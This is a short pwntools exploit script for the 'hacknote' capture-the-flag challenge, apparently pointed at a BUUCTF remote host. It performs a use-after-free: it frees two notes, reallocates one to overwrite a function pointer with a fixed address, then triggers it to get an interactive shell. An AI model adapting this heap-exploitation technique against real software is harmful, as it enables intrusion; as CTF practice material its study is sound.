# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'hacknote'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', '27762')

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(size, content):
    p.sendlineafter("Your choice :", '1')
    p.sendlineafter("Note size :", str(size))
    p.sendafter("Content :", content)

def delete(idx):
    p.sendlineafter("Your choice :", '2')
    p.sendlineafter("Index :", str(idx))

def display(idx):
    p.sendlineafter("Your choice :", '3')
    p.sendlineafter("Index :", str(idx))

def exit():
    p.sendlineafter("Your choice :", '4')

def pwn():
    add(32, 'chunk0')
    add(32, 'chunk1')
    delete(0)
    delete(1)
    # debug(0)
    add(8, p32(0x08048945))
    # debug(0)
    display(0)
    p.interactive()

if __name__ == '__main__':
    pwn()
